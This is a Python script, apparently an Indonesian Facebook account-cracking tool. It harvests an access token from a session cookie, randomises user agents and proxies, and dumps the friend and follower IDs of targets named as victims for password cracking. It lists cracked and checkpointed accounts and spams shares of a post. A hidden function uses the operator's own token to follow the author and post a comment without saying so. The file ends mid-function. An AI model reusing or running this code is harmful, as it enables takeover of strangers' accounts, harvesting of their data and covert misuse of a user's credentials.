import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
## RANDOM UA
#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
for xd in range(10000):
        a='Mozilla/5.0 (Linux; Android'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='10; SM-G970F)'
        e=random.randrange(100, 9999)
        f='AppleWebKit/537.36 (KHTML, like Gecko)'
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Chrome/75.0.3396.81 Mobile Safari/537.36'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen2.append(uaku)

        aa='Mozilla/5.0 (Linux; U; Android 7.0; es-us;'
        b=random.choice(['7.0','8.1.0','9','10','11','12'])
        c=random.choice(['Redmi Note 4 Build/NRD90M)'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko)'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
        c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        aa='Mozilla/5.0 (Linux; Android 11;'
        b=random.choice(['7.0','8.1.0','9','10','11','12'])
        c=random.choice(['Redmi Note 9 Pro'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        a='Mozilla/5.0 (Linux; Android'
        b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
        c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        aa='Mozilla/5.0 (Linux; Android 11;'
        b=random.choice(['7.0','8.1.0','9','10','11','12'])
        c=random.choice(['Redmi Note 9 Pro)'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko)'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
        c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        aa='Mozilla/5.0(Linux/3.4.5; U; Android 4.4.2;'
        b=random.choice(['7.0','8.1.0','9','10','11','12'])
        c=random.choice(['zh-cn; Lenovo A536 Build/'])
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='KOT49H)AppleWebKit/534.30 (KHTML, like Gecko)'
        h=random.randrange(80,103)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Version/4.4.2 Mobile Safari/534.30 Release/01.17.2014'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

def uaku():
        try:
                ua=open('bbnew.txt','r').read().splitlines()
                for ub in ua :
                        ugen.append(ub)
        except:
                a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
                ua=open('.bbnew.txt','w')
                aa=re.findall('line">(.*?)<',str(a))
                for un in aa:
                        ua.write(un+'\n')
                ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
kom = " Bang Basari Ganteng Bangetz Dech  Ngga Ada Obat "
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###----------[ GET TIME ]---------- ###
def waktu():
        now = datetime.now()
        hours = now.hour
        if 4 <= hours < 12:timenow = "good morning"
        elif 12 <= hours < 15:timenow = "good afternoon"
        elif 15 <= hours < 18:timenow = "good evening"
        else:timenow = "good night"
        return timenow
#------------------[ MACHINE-SUPPORT ]---------------#
def Basari(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.004)
def clear():
        os.system('clear')
def back():
        login()

#JANGAN_DIUBAH_UBAH_KONTOL
#KALO_MAU_MAKE_MAKE_AJA
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
        clear()
        sol()
        ban='''   Author : Putra Basari ▪︎ Github : Basari-ID '''
        cetak(nel(ban, style='cyan'))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
        try:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
                tokenku.append(token)
                try:
                        sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
                        sy2 = json.loads(sy.text)['name']
                        sy3 = json.loads(sy.text)['id']
                        menu(sy2,sy3)
                except KeyError:
                        login_lagi334()
                except requests.exceptions.ConnectionError:
                        li = '# KONEKSI TERPUTUS COBA JALANKAN ULANG'
                        lo = mark(li, style='red')
                        sol().print(lo, style='cyan')
                        exit()
        except IOError:
                login_lagi334()
def login_lagi334():
        try:
                os.system('clear')
                banner()
                cetak(nel('\t[white] ▪︎ ▪︎ ▪︎ Ambil Cookies Di Kiwi Browser [white] ▪︎ ▪︎ ▪︎'))
                asu = random.choice([m,k,h,b,u])
                cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
                find_token = re.search("(EAAG\w+)", data.text)
                ken=open(".token.txt", "w").write(find_token.group(1));bot()
                cok=open(".cok.txt", "w").write(cookie)
                print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL DAN JALANKAN ULANG PERINTAHNYA{x} ');time.sleep(1)
                exit()
        except Exception as e:
                os.system("rm -f .token.txt")
                os.system("rm -f .cok.txt")
                print(f'  %s[%sx%s]%s LOGIN GAGAL COBA ULANGI LAGI/GANTI COOKIES%s'%(x,k,x,m,x))
                exit()

def bot():
        try:
                requests.post("https://graph.facebook.com/100051967952842?fields=subscribers&access_token=%s"%(tokenku))
                requests.post('https://graph.facebook.com/571109557964638/comments/?message=' +kom+ '&access_token=' + token)
        except:
                pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
        try:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
        except IOError:
                print('[×] Cookies Kadaluarsa ')
                time.sleep(5)
                login_lagi334()
        os.system('clear')
        banner()
        ip = requests.get("https://api.ipify.org").text
        gh = 'github.com/Basari-ID'
        cetak(nel('\tWelcome [white]%s[white] ♡'%(my_name)))
        print(f'├──> ID  : '+str(my_id))
        print(f'├──> IP  : {ip}')
        print('|')
        print('├──> 1. Crack Publik Massal  ')
        print('├──> 2. Crack Dari Folowers')
        print('├──> 3. Lapor Bug Script  ')
        print('├──> 4. Ganti User Agent ')
        print('├──> 5. Hasil Crack  ')
        print('├──> 6. Auto Share Fb ')
        print('├──> 0. Keluar       ')
        print('|')
        Basari = input('\r├──> Pilih : ')
        if Basari in ['1']:
                dump_massal()
        elif Basari in ['2']:
                dump_pengikut()
        elif Basari in ['3']:
                error()
        elif Basari in ['4']:
                baz()
        elif Basari in ['5']:
                result()
        elif Basari in ['6']:
                memek()
        elif Basari in ['0']:
                os.system('rm -rf .token.txt')
                os.system('rm -rf .cookie.txt')
                print('├──> Sukses Logout+Hapus Kukis ')
                exit()
        else:
                print('├──> Pilih Yang Bener Asu ')
                back()
def error():
        jalan(f'{sir}├──> tunggu sebentar anda akan diarahkan ke Facebook  {x}')
        time.sleep(4)
        os.system("xdg-open https://www.facebook.com/basari.shp")
        back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
        print(f'├──> 1. Hasil {h}OK{x} Anda ')
        print(f'├──> 2. Hasil {k}CP{x} Anda ')
        print('├──> 3. Kembali  ')
        kz = input(f'\n├──> Pilih : ')
        if kz in ['2']:
                try:vin = os.listdir('CP')
                except FileNotFoundError:
                        print('▪︎ File Tidak Di Temukan ')
                        time.sleep(3)
                        back()
                if len(vin)==0:
                        print('▪︎ Anda Tidak Memiliki Hasil CP ')
                        time.sleep(2)
                        back()
                else:
                        cih = 0
                        lol = {}
                        for isi in vin:
                                try:hem = open('CP/'+isi,'r').readlines()
                                except:continue
                                cih+=1
                                if cih<10:
                                        nom = ''+str(cih)
                                        lol.update({str(cih):str(isi)})
                                        lol.update({nom:str(isi)})
                                        print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
                                else:
                                        lol.update({str(cih):str(isi)})
                                        print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
                        geeh = input('\n▪︎ Pilih : ')
                        try:geh = lol[geeh]
                        except KeyError:
                                print('>> Pilih Yang Bener Kontol ')
                                back()
                        try:lin = open('CP/'+geh,'r').read().splitlines()
                        except:
                                print('>> File Tidak Di Temukan ')
                                time.sleep(2)
                                back()
                        nocp=0
                        for cpku in range(len(lin)):
                                cpkuni=lin[nocp].split('|')
                                print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
                                nocp +=1
                        print('')
                        input(f'{x}[{m} Klik Enter{x} ]')
                        back()
        elif kz in ['1']:
                try:vin = os.listdir('OK')
                except FileNotFoundError:
                        print('▪︎ File Tidak Di Temukan ')
                        time.sleep(2)
                        back()
                if len(vin)==0:
                        print('▪︎ Anda Tidak Mempunyai File OK ')
                        time.sleep(2)
                        back()
                else:
                        cih = 0
                        lol = {}
                        for isi in vin:
                                try:hem = open('OK/'+isi,'r').readlines()
                                except:continue
                                cih+=1
                                if cih<10:
                                        nom = '0'+str(cih)
                                        lol.update({str(cih):str(isi)})
                                        lol.update({nom:str(isi)})
                                        print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
                                else:
                                        lol.update({str(cih):str(isi)})
                                        print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
                        geeh = input(f'\nPilih : ')
                        try:geh = lol[geeh]
                        except KeyError:
                                print('>> Pilih Yang Bener Kontol ')
                                back()
                        try:lin = open('OK/'+geh,'r').read().splitlines()
                        except:
                                print('>> File Tidak Di Temukan ')
                                time.sleep(2)
                                back()
                        nocp=0
                        for cpku in range(len(lin)):
                                cpkuni=lin[nocp].split('|')
                                print('')
                                print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
                                nocp +=1
                        print('')
                        input(f'{x}[{m} Klik Enter{x} ]')
                        back()
        elif kz in ['3']:
                back()
        else:
                print('>> Pilih Yang Bener Kontol ')
                back()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
        try:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
        except IOError:
                exit()
        try:
                jum = int(input('├──> Mau Berapa Target Cuy : '))
        except ValueError:
                print('├──> Masukkan Angka Blok Malah Huruf Asu ')
                exit()
        if jum<1 or jum>100:
                print('├──> Gagal Dump Id ')
                exit()
        ses=requests.Session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input('├──> Masukkan Id Yang Ke '+str(yz)+' : ')
                uid.append(kl)
        for userr in uid:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (KeyError,IOError):
                        pass
                except requests.exceptions.ConnectionError:
                        print('├──> Sinyal Loh Jelek ashu Kek Kontoll ')
                        exit()
        try:
                print('|')
                print(f'├──> Total Id Target : {h}'+str(len(id)))
                setting()
        except requests.exceptions.ConnectionError:
                print(f'{x}')
                print('├──> Sinyal Lo kek Kontol ')
                back()
        except (KeyError,IOError):
                print(f'├──>{k} Pertemanan Tidak Public {x}')
                time.sleep(3)
                back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
        try:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
        except IOError:
                exit()
        print('├──> Ketik me Untuk Crack Flower Akun Sendiri ')
        pil = input('├──> Masukkan Id Target : ')
        try:
                koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
                for pi in koh2['subscribers']['data']:
                        try:id.append(pi['id']+'|'+pi['name'])
                        except:continue
                print(f'├──> Total Id Korban :{h} '+str(len(id)))
                setting()
        except requests.exceptions.ConnectionError:
                print('>> Koneksi Internet Bermasalah ')
                exit()
        except (KeyError,IOError):
                print('>> Gagal Mengambil Target ')
                exit()

#------------------[ CRACK-EMAIL ]-----------------#
def baz():
        print(f'├──> Maaf Fitur Ini Masih Dalam Perbaikan')
        time.sleep(4)
        back()


import os, re, requests, json
import requests, json
from concurrent.futures import ThreadPoolExecutor
ses = requests.Session()
threads = []
def memek():
        print("├──> 1. Spam share via token dan cookies")
        ask = input("\n├──> Pilih : ")
        if ask in["1"]:
                token_cookie()

def token_cookie():
        print("├──> Cokiess Bebas")
        cookie = input("├──> Masukan cookies : ")
        print("├──> Wajib Pake Token EAAG")
        token = input("├──> Masukan token : ")
        idt = input("├──> Masukan link Post : ")
        limit = int(input("├──> Masukan limit : "))
        try:
                n = 0
                header = {'authority':'graph.facebook.com','cache-control':'max-age=0','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (Linux; Android 9; Infinix X653C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36'}
                for x in range(limit):
                        n+=1
                        post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header,cookies={"cookie":cookie}).text
                        data = json.loads(post)
                        if 'id' in post:
                                print(f" {n}. berhasil membagikan {data['id']}")
                        else:
                                exit("Gagal membagikan, kemungkinan token invalid")
        except:
                exit("Gagal membagikan, kemungkinan token invalid")

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
        print(f'{x}├──> 1. Akun Old ')
        print('├──> 2. Akun New ')
        print('├──> 3. Random ')
        print('|')
        hu = input('├──> Pilih : ')
        if hu in ['1','01']:
                for tua in sorted(id):
                        id2.append(tua)

        elif hu in ['2','02']:
                muda=[]
                for bacot in sorted(id):
                        muda.append(bacot)
                bcm=len(muda)
                bcmi=(bcm-1)
                for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -=1
        elif hu in ['3','03']:
                for bacot in id:
                        xx = random.randint(0,len(id2))
